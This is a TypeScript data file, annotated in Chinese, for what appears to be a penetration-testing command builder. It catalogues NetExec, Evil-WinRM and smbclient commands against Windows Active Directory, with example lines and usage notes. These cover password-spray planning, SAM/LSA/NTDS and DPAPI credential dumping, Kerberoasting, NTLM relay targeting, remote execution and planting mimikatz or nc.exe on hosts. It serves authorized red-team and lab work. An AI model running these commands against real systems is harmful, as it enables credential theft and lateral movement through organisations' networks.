import type { Tool } from '../../types';
import { buildNetExecAuth, buildEvilWinRMAuth, v } from '../../lib/auth';

/**
 * NetExec (nxc) v1.5.1 数据文件
 * 参数定义来源: 本机 nxc smb/ldap/winrm/mssql --help 与 -L 模块列表
 * 通用语法: nxc <protocol> <target> -u USER -d DOMAIN (-p PASS | -H HASH | -k) [选项]
 */
export const netexecTools: Tool[] = [
  {
    id: 'nxc-smb',
    name: 'NetExec SMB — 枚举',
    category: 'netexec',
    homepage: 'https://github.com/Pennyw0rth/NetExec',
    description: 'SMB 协议信息枚举 (共享/用户/组/会话/RID 爆破/中继目标筛选)',
    commands: [
      {
        id: 'nxc-smb-enum',
        title: 'SMB 基础枚举',
        description: '探测目标 SMB 版本、域名、签名要求，标记 (Pwn3d!) 表示有管理员权限',
        build: (p) => buildNetExecAuth(p, 'smb'),
        usage: `语法: nxc smb <target> -u <用户> -d <域> (-p <密码> | -H <NT哈希> | -k)
  target          IP/网段/CIDR/主机名/目标列表文件,可多个
  -u/-p           用户名/密码 (可传文件做喷洒)
  -H, --hash      NTLM 哈希 (PtH)
  -k, --kerberos  Kerberos 认证 (需 KRB5CCNAME 或配合 --kdcHost)
  --local-auth    本地账户认证 (不追加域)
输出会标注 SMBv1、签名 (signing:True/False)、OS 版本与 (Pwn3d!) 管理员标记。`,
        example: 'nxc smb 192.168.1.0/24 -u administrator -d corp.local -p Password123',
      },
      {
        id: 'nxc-smb-shares',
        title: '枚举共享',
        description: '枚举共享并测试读/写权限',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --shares`,
        usage: `--shares [SHARE]  枚举共享列表及当前账户的 READ/WRITE 权限;
  可指定单个共享名过滤;--exclude-shares 排除指定共享;
  --no-write-check 跳过写测试 (避免在目标留下痕迹)。`,
        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 --shares',
      },
      {
        id: 'nxc-smb-users',
        title: '枚举域用户',
        description: '--users 枚举域用户;--users-export 导出到文件',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --users`,
        usage: `--users [USER]        枚举域用户 (指定用户名则只查该用户)
  --users-export FILE  将用户列表导出到文件 (供密码喷洒)`,
        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 --users-export users.txt',
      },
      {
        id: 'nxc-smb-groups',
        title: '枚举域组/本地组',
        description: '--groups 枚举域组;--local-groups 枚举本地组 (如本地 Administrators)',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --groups`,
        usage: `--groups [GROUP]         枚举域组 (指定组名则列出成员)
  --local-groups [GROUP]  枚举目标本地组,常用: --local-groups Administrators`,
        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 --local-groups Administrators',
      },
      {
        id: 'nxc-smb-pass-pol',
        title: '枚举密码策略',
        description: '导出域密码策略 (锁定阈值/最小长度等,用于规划密码喷洒)',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --pass-pol`,
        usage: `--pass-pol  导出密码策略: 最小密码长度、密码历史、锁定阈值、
  锁定期限等。做密码喷洒前必看,避免锁死账户。`,
        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 --pass-pol',
      },
      {
        id: 'nxc-smb-rid-brute',
        title: 'RID 爆破枚举用户',
        description: '--rid-brute 通过 SID 遍历枚举域/本地用户,默认上限 4000,可用 guest 空会话',
        build: (p) => `nxc smb ${v(p.targetIP, 'TARGET')} -u ${v(p.username, 'guest')} -p '' --rid-brute`,
        usage: `语法: nxc smb <target> -u <用户> -p <密码> --rid-brute [MAX_RID]
  --rid-brute [MAX_RID]  通过 LsarLookupSids 遍历 RID 枚举所有账户/组,
    默认最大 RID 4000,大域可加大 (如 10000)
常配合 guest/空密码或任意低权限账户使用,在 RestrictAnonymous=0 时
甚至无需有效凭据;等效于 impacket-lookupsid。`,
        example: "nxc smb 192.168.1.10 -u guest -p '' --rid-brute 5000",
      },
      {
        id: 'nxc-smb-sessions',
        title: '枚举登录会话',
        description: '--loggedon-users / --qwinsta / --smb-sessions 定位高权限用户登录位置',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --loggedon-users`,
        usage: `--loggedon-users [USER]  枚举当前登录用户 (用于找 DA 登录的机器)
  --qwinsta [USER]       枚举终端会话 (qwinsta)
  --smb-sessions         枚举活动 SMB 会话
  --reg-sessions [USER]  通过注册表枚举会话 (需要管理员)
定位到高权限会话后,可对相应机器做 NTLM Relay 或横向移动。`,
        example: 'nxc smb 192.168.1.0/24 -u jdoe -d corp.local -p Password123 --loggedon-users',
      },
      {
        id: 'nxc-smb-disks',
        title: '枚举磁盘与网卡',
        description: '--disks 枚举磁盘;--interfaces 枚举网络接口 (找多网段跳板)',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --disks`,
        usage: `--disks       枚举目标磁盘分区及剩余空间
  --interfaces  枚举网络接口 (识别多宿主主机,找跨网段跳板)`,
        example: 'nxc smb 192.168.1.10 -u admin -d corp.local -p Password123 --interfaces',
      },
      {
        id: 'nxc-smb-spider',
        title: 'Spider 爬取共享文件',
        description: '递归爬取共享目录,按文件名模式过滤敏感文件',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --spider C$ --pattern txt`,
        usage: `--spider SHARE        要爬取的共享 (如 C$/ADMIN$/共享名)
  --spider-folder DIR   起始目录 (默认根)
  --pattern / --regex   文件名过滤 (如 --pattern password xml config)
  --content             同时搜索文件内容
  --depth N             最大递归深度;--only-files 只列文件`,
        example: "nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 --spider C$ --spider-folder 'Users' --pattern txt xml config --depth 3",
      },
      {
        id: 'nxc-smb-relay-list',
        title: '生成 NTLM Relay 目标列表',
        description: '--gen-relay-list 扫描网段,输出所有 SMB 签名关闭的主机 (可中继目标)',
        build: (p) => `nxc smb ${v(p.targetIP, 'SUBNET')} --gen-relay-list ${v(p.fileName, 'relay_targets.txt')}`,
        usage: `语法: nxc smb <网段> --gen-relay-list <输出文件>
无需凭据。探测每台主机的 SMB signing 要求,把签名未强制
(signing:False) 的主机写入文件,该文件可直接作为
impacket-ntlmrelayx 的 -tf 目标文件。`,
        example: 'nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt',
      },
      {
        id: 'nxc-smb-local-auth',
        title: '本地账户认证',
        description: '--local-auth 用本地账户 (如本地 administrator) 认证,常用于工作组/本地管理员复用',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --local-auth`,
        usage: `--local-auth  以目标本地账户认证 (不使用域);
常用于: 本地管理员密码复用喷洒、工作组机器、
已导出的本地 SAM 哈希横向 (-H 配合 --local-auth)。`,
        example: 'nxc smb 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth',
      },
    ],
  },
  {
    id: 'nxc-smb-dump',
    name: 'NetExec SMB — 凭据导出与执行',
    category: 'netexec',
    homepage: 'https://github.com/Pennyw0rth/NetExec',
    description: 'SAM/LSA/NTDS/DPAPI 导出、命令执行与漏洞模块 (需管理员权限)',
    commands: [
      {
        id: 'nxc-smb-sam',
        title: '导出本地 SAM',
        description: '导出目标本地账户哈希,可配合 --local-auth 横向',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --sam`,
        usage: `--sam [{regdump,secdump}]  导出本地 SAM 哈希 (需管理员);
  可选导出方法: regdump (注册表) / secdump (服务),默认 drsuapi 不适用本项。
导出的本地 administrator 哈希常用于 Pass-the-Hash 横向。`,
        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 --sam',
      },
      {
        id: 'nxc-smb-lsa',
        title: '导出 LSA 秘密',
        description: '导出 LSA Secrets (服务账户明文/DPAPI 密钥等)',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --lsa`,
        usage: `--lsa [{regdump,secdump}]  导出 LSA Secrets (需管理员):
  服务账户明文密码、$MACHINE.ACC、DPAPI_SYSTEM、缓存凭据线索等。`,
        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 --lsa',
      },
      {
        id: 'nxc-smb-ntds',
        title: 'DCSync 导出 NTDS',
        description: '对 DC 执行 DCSync,导出全域哈希 (需域管或复制权限)',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --ntds`,
        usage: `--ntds [{vss,drsuapi}]  导出 NTDS.dit (默认 drsuapi,即 DCSync);
  vss 通过卷影副本 (动静大)
  --user USER    只导指定用户;--enabled 只导启用账户;
  --history      包含密码历史;--kerberos-keys 包含 AES/DES 密钥。`,
        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 --ntds --enabled',
      },
      {
        id: 'nxc-smb-dpapi',
        title: '导出 DPAPI 凭据',
        description: '--dpapi 导出浏览器/凭据管理器中由 DPAPI 保护的秘密',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --dpapi`,
        usage: `--dpapi [{cookies,nosystem} ...]  导出 DPAPI 保护的秘密
  (浏览器保存的密码、Windows 凭据管理器);
  cookies 额外导浏览器 cookies;nosystem 不用 SYSTEM 上下文。
  --mkfile FILE  离线 masterkey 文件;--pvk FILE 域备份密钥。`,
        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 --dpapi',
      },
      {
        id: 'nxc-smb-exec',
        title: 'SMB 执行命令',
        description: '-x 执行 CMD,默认 wmiexec 方式,可用 --exec-method 更换',
        build: (p) => `${buildNetExecAuth(p, 'smb')} -x "whoami"`,
        usage: `-x "CMD"              执行 CMD 命令 (需管理员)
  -X "PS"             执行 PowerShell;--obfs 混淆 PS;--amsi-bypass FILE
  --exec-method M     执行方式: wmiexec (默认) / atexec / smbexec / mmcexec
  --codec CODEC       输出编码 (中文目标常需 gbk)
  --no-output         不取回输出 (静默执行)`,
        example: 'nxc smb 192.168.1.10 -u administrator -d corp.local -p Password123 -x "whoami /all"',
      },
      {
        id: 'nxc-smb-put',
        title: '上传/下载文件',
        description: '--put-file 上传、--get-file 下载,走 SMB 共享落地',
        build: (p) => `${buildNetExecAuth(p, 'smb')} --put-file ${v(p.fileName, 'LOCAL_FILE')} ${v(p.remotePath, 'REMOTE_PATH')}`,
        usage: `--put-file <本地> <远端>   上传,例: --put-file ./nc.exe '\\\\Windows\\\\Temp\\\\nc.exe'
  --get-file <远端> <本地>   下载;--append-host 文件名附加主机名
  --share SHARE            指定落地共享 (默认 C$)`,
        example: "nxc smb 192.168.1.10 -u admin -d corp.local -p Password123 --put-file ./mimikatz.exe '\\\\Windows\\\\Temp\\\\m.exe'",
      },
      {
        id: 'nxc-smb-modules',
        title: '漏洞检查/利用模块',
        description: '-M 加载模块: zerologon/nopac/coerce_plus/ms17-010/spooler/webdav/gpp_password 等',
        build: (p) => `${buildNetExecAuth(p, 'smb')} -M ${v('', 'MODULE')}`,
        usage: `-M, --module <模块>   加载 nxc 模块;-L 列出全部;--options 查看模块参数;
  -o KEY=VAL 传模块参数
常用低权限检查模块 (nxc v1.5.1):
  zerologon     CVE-2020-1472 检测        nopac        CVE-2021-42278/87 检测
  ms17-010      永恒之蓝检测              coerce_plus  强制认证 (需 -o LISTENER=IP)
  spooler       Print Spooler 检测        webdav       WebClient 服务检测 (HTTP relay)
  gpp_password  GPP cpassword 解密        timeroast    NTP 哈希窃取
例: nxc smb <dc> -u u -p p -M zerologon`,
        example: 'nxc smb 192.168.1.10 -u jdoe -d corp.local -p Password123 -M zerologon',
      },
    ],
  },
  {
    id: 'nxc-ldap',
    name: 'NetExec LDAP — 枚举与 BloodHound',
    category: 'netexec',
    homepage: 'https://github.com/Pennyw0rth/NetExec',
    description: 'LDAP 域信息枚举、Roasting 与 BloodHound 数据采集',
    commands: [
      {
        id: 'nxc-ldap-enum',
        title: 'LDAP 基础枚举',
        description: '连接 DC 的 LDAP,输出域基础信息',
        build: (p) => buildNetExecAuth(p, 'ldap'),
        usage: `语法: nxc ldap <DC_IP> -u <用户> -d <域> (-p <密码> | -H <哈希> | -k)
LDAP 协议枚举通常以 DC 为目标;Kerberos 模式建议加 --kdcHost <DC_FQDN>。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123',
      },
      {
        id: 'nxc-ldap-bloodhound',
        title: 'BloodHound 全量采集',
        description: '--bloodhound -c All 采集全部集合,输出 BloodHound CE/Legacy 兼容的 JSON',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --bloodhound -c All`,
        usage: `语法: nxc ldap <DC> <认证> --bloodhound -c <集合>
  -c, --collection  采集集合,可逗号组合:
    Default (默认) / Group / LocalAdmin / Session / Trusts / DCOM / RDP /
    PSRemote / LoggedOn / Container / ObjectProps / ACL / DCOnly / All
  --dns-server IP   指定 DNS 服务器 (采集时需要解析域内主机名)
采集结果写入 ~/.nxc/logs/ 下的 zip,直接拖入 BloodHound CE。
Session/LoggedOn 集合耗时长且动静大,大域建议先 Default 或 DCOnly。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --bloodhound -c All --dns-server 192.168.1.10',
      },
      {
        id: 'nxc-ldap-bloodhound-dconly',
        title: 'BloodHound 快速采集 (DCOnly)',
        description: '只从 DC 采集目录数据,不触碰成员机,速度快、流量小',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --bloodhound -c DCOnly`,
        usage: `-c DCOnly  仅通过 LDAP 从 DC 采集 (用户/组/计算机/GPO/OU/信任/ACL 结构),
不连接任何成员服务器,适合大域快速出图;
缺点是缺少本地管理员/会话等主机侧边 (那些需要逐机采集)。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --bloodhound -c DCOnly',
      },
      {
        id: 'nxc-ldap-kerberoast',
        title: 'Kerberoasting',
        description: '--kerberoasting 请求 SPN 账户 TGS 并输出 hashcat 格式到文件',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --kerberoasting ${v(p.fileName, 'kerberoast.txt')}`,
        usage: `--kerberoasting <输出文件>  枚举有 SPN 的用户并请求 RC4 TGS,
哈希写入文件,直接 hashcat -m 13100 破解。
等效于 impacket-GetUserSPNs -request,但一次输出全部账户。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --kerberoasting kerb.txt',
      },
      {
        id: 'nxc-ldap-asreproast',
        title: 'AS-REP Roasting',
        description: '--asreproast 找出无需预认证的用户并导出 AS-REP 哈希',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --asreproast ${v(p.fileName, 'asrep.txt')}`,
        usage: `--asreproast <输出文件>  枚举 DONT_REQUIRE_PREAUTH 用户并抓取
AS-REP 哈希,hashcat -m 18200 破解;
等效于 impacket-GetNPUsers。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --asreproast asrep.txt',
      },
      {
        id: 'nxc-ldap-delegation',
        title: '枚举委派关系',
        description: '--find-delegation 查找非约束/约束委派,--trusted-for-delegation 列出可委派账户',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --find-delegation`,
        usage: `--find-delegation          枚举委派关系 (Unconstrained/Constrained/RBCD)
  --trusted-for-delegation  列出 TrustedForDelegation (非约束委派) 账户
找到约束委派账户后可配合 impacket-getST -impersonate 利用。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --find-delegation',
      },
      {
        id: 'nxc-ldap-gmsa',
        title: '读取 gMSA 密码',
        description: '--gmsa 读取有权限账户的 gMSA 托管密码并算出 NT 哈希',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --gmsa`,
        usage: `--gmsa                      枚举并解密有权限读取的 gMSA 密码 (输出 NT 哈希)
  --gmsa-convert-id <id>    转换指定 gMSA 的密钥 ID
  --gmsa-decrypt-lsa <值>   解密来自 LSA 的 gMSA 密文
前提: 当前账户在 gMSA 的 PrincipalsAllowedToRetrieveManagedPassword 中。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --gmsa',
      },
      {
        id: 'nxc-ldap-admin-count',
        title: '高权限账户与宽松配置',
        description: '--admin-count 枚举受保护对象;--password-not-required 找密码无关账户',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --admin-count`,
        usage: `--admin-count             列出 adminCount=1 的账户 (当前或曾经的高权限账户)
  --password-not-required   列出 PASSWD_NOTREQD 账户 (可空密码/无需预认证风险面)`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --admin-count',
      },
      {
        id: 'nxc-ldap-dc-list',
        title: '域控列表与域 SID',
        description: '--dc-list 列出所有 DC;--get-sid 获取域 SID (金票必需)',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --dc-list`,
        usage: `--dc-list   枚举域内所有域控制器
  --get-sid   获取域 SID (伪造黄金票据、构造 ACL 时常用)
  --users / --computers  枚举域用户/计算机`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --dc-list --get-sid',
      },
      {
        id: 'nxc-ldap-query',
        title: '自定义 LDAP 查询',
        description: '--query 执行任意 LDAP 过滤器,按需提取属性',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} --query "${v('', '(LDAP_FILTER)')}" "${v('', 'ATTRIBUTE')}"`,
        usage: `--query <过滤器> <属性>  自定义 LDAP 查询:
  过滤器为标准 LDAP 语法,属性为空则返回全部
例:
  --query "(servicePrincipalName=*)" "sAMAccountName,servicePrincipalName"
  --query "(&(objectClass=user)(description=*))" "sAMAccountName,description"`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 --query "(servicePrincipalName=*)" "sAMAccountName,servicePrincipalName"',
      },
      {
        id: 'nxc-ldap-adcs',
        title: 'ADCS 枚举 (模块)',
        description: '-M adcs 枚举证书服务与模板,辅助 ESC 系列漏洞排查',
        build: (p) => `${buildNetExecAuth(p, 'ldap')} -M adcs`,
        usage: `-M adcs          查找 PKI Enrollment Services 与证书模板
  -M certipy-find  集成 certipy find,输出可利用模板 (ESC1-8)
  -M daclread      读取对象 DACL (ACL 攻击面分析)
深入利用建议使用独立 Certipy 模块 (见左侧 Certipy 分类)。`,
        example: 'nxc ldap 192.168.1.10 -u jdoe -d corp.local -p Password123 -M certipy-find',
      },
    ],
  },
  {
    id: 'nxc-winrm',
    name: 'NetExec WinRM',
    category: 'netexec',
    homepage: 'https://github.com/Pennyw0rth/NetExec',
    description: 'WinRM 协议枚举和远程执行',
    commands: [
      {
        id: 'nxc-winrm-enum',
        title: 'WinRM 枚举',
        description: '探测 5985/5986 的 WinRM 访问与权限',
        build: (p) => buildNetExecAuth(p, 'winrm'),
        usage: `语法: nxc winrm <target> -u <用户> -d <域> (-p <密码> | -H <哈希>)
检测 WinRM (5985 HTTP / 5986 HTTPS) 可达性与认证,
(Pwn3d!) 表示可直接拿交互 shell (配合 evil-winrm)。`,
        example: 'nxc winrm 192.168.1.0/24 -u administrator -d corp.local -p Password123',
      },
      {
        id: 'nxc-winrm-exec',
        title: 'WinRM 执行命令',
        description: '-x 执行 CMD,-X 执行 PowerShell',
        build: (p) => `${buildNetExecAuth(p, 'winrm')} -x "ipconfig"`,
        usage: `-x "CMD"   通过 WinRM 执行 CMD 命令
  -X "PS"    执行 PowerShell;--obfs 混淆
需要目标开放 WinRM 且账户在 Remote Management Users 或管理员组。`,
        example: 'nxc winrm 192.168.1.10 -u administrator -d corp.local -p Password123 -X "Get-Process"',
      },
    ],
  },
  {
    id: 'nxc-mssql',
    name: 'NetExec MSSQL',
    category: 'netexec',
    homepage: 'https://github.com/Pennyw0rth/NetExec',
    description: 'MSSQL 枚举和利用',
    commands: [
      {
        id: 'nxc-mssql-enum',
        title: 'MSSQL 枚举',
        description: '探测 MSSQL 实例与认证 (默认 1433)',
        build: (p) => buildNetExecAuth(p, 'mssql'),
        usage: `语法: nxc mssql <target> -u <用户> -d <域> (-p <密码> | -H <哈希>)
默认 Windows 认证;--local-auth 使用 SQL 账户 (如 sa)。`,
        example: 'nxc mssql 192.168.1.20 -u sa -p SqlPass123 --local-auth',
      },
      {
        id: 'nxc-mssql-query',
        title: 'MSSQL 执行查询',
        description: '-q 执行任意 T-SQL 语句',
        build: (p) => `${buildNetExecAuth(p, 'mssql')} -q "SELECT @@version"`,
        usage: `-q "<SQL>"  执行 T-SQL 查询
常用:
  SELECT @@version                          版本信息
  SELECT name FROM sys.databases            数据库列表
  EXEC sp_linkedservers                     链接服务器 (横向跳板)`,
        example: 'nxc mssql 192.168.1.20 -u sa -p SqlPass123 --local-auth -q "EXEC sp_linkedservers"',
      },
      {
        id: 'nxc-mssql-xpcmd',
        title: 'MSSQL xp_cmdshell 执行命令',
        description: '-x 通过 xp_cmdshell 执行系统命令 (需 sysadmin)',
        build: (p) => `${buildNetExecAuth(p, 'mssql')} -x "whoami"`,
        usage: `-x "CMD"  nxc 自动启用 xp_cmdshell 并执行命令 (需 sysadmin 权限)
xp_cmdshell 以 SQL Server 服务账户运行,该账户常有高权限或
可用于 MSSQL 链接服务器横向。`,
        example: 'nxc mssql 192.168.1.20 -u sa -p SqlPass123 --local-auth -x "whoami"',
      },
    ],
  },
  {
    id: 'evil-winrm',
    name: 'Evil-WinRM',
    category: 'netexec',
    homepage: 'https://github.com/Hackplayers/evil-winrm',
    description: 'WinRM 交互式 Shell',
    commands: [
      {
        id: 'evil-winrm-connect',
        title: 'Evil-WinRM 连接',
        description: '获取交互式 PowerShell 会话,内置 upload/download',
        build: (p) => buildEvilWinRMAuth(p),
        usage: `语法: evil-winrm -i <主机> -u <用户> (-p <密码> | -H <NT哈希>)
进入会话后:
  upload <本地> <远端>   上传文件 (自带 Invoke-Mimikatz 等 PS1)
  download <远端> <本地> 下载文件
  menu                   加载内置 PowerShell 函数 (Bypass-4MSI 等)`,
        example: 'evil-winrm -i 192.168.1.10 -u administrator -p Password123',
      },
      {
        id: 'evil-winrm-ssl',
        title: 'Evil-WinRM SSL 连接',
        description: '-S 走 5986 HTTPS,加密通信',
        build: (p) => `${buildEvilWinRMAuth(p)} -S`,
        usage: `-S               使用 SSL (5986 端口)
  -c <证书> -k <私钥>  证书认证
  -P <端口>           自定义端口 (默认 5985/5986)`,
        example: 'evil-winrm -i 192.168.1.10 -u administrator -p Password123 -S',
      },
      {
        id: 'evil-winrm-exec',
        title: 'Evil-WinRM 加载脚本',
        description: '-s 指定本地 PS1 目录,会话内可直接调用脚本中的函数',
        build: (p) => `${buildEvilWinRMAuth(p)} -s ${v(p.remotePath, '/path/to/ps1/')}`,
        usage: `-s <目录>  加载本地 PowerShell 脚本目录,会话内直接调用其中函数
  -e <目录>  加载可执行文件目录,配合 menu 使用
常用于加载 PowerView.ps1 / Invoke-Mimikatz.ps1 等。`,
        example: 'evil-winrm -i 192.168.1.10 -u administrator -p Password123 -s /opt/privesc/ps1/',
      },
    ],
  },
  {
    id: 'smbclient',
    name: 'smbclient',
    category: 'netexec',
    homepage: 'https://www.samba.org/',
    description: 'SMB 客户端交互 (Samba 套件)',
    commands: [
      {
        id: 'smbclient-list',
        title: '列举共享',
        description: '-L 列出目标共享,无需登录共享本身',
        build: (p) => `smbclient -L //${v(p.targetIP, 'TARGET')} -U ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}%${v(p.password, 'PASSWORD')}`,
        usage: `语法: smbclient -L //<target> -U <域>/<用户>%<密码>
  -N           匿名 (空会话)
  -U           用户名%密码;省略密码则交互输入`,
        example: 'smbclient -L //192.168.1.10 -U corp.local/jdoe%Password123',
      },
      {
        id: 'smbclient-connect',
        title: '连接共享',
        description: '连接指定共享进入交互式 FTP 风格 shell',
        build: (p) => `smbclient //${v(p.targetIP, 'TARGET')}/C$ -U ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}%${v(p.password, 'PASSWORD')}`,
        usage: `语法: smbclient //<target>/<共享> -U <域>/<用户>%<密码>
进入后: ls / cd / get <文件> / put <文件> / mget / prompt (关确认)
  -c "<命令>"  非交互执行,例: -c "get secrets.txt"`,
        example: 'smbclient //192.168.1.10/SharedDocs -U corp.local/jdoe%Password123 -c "get passwords.xlsx"',
      },
    ],
  },
];
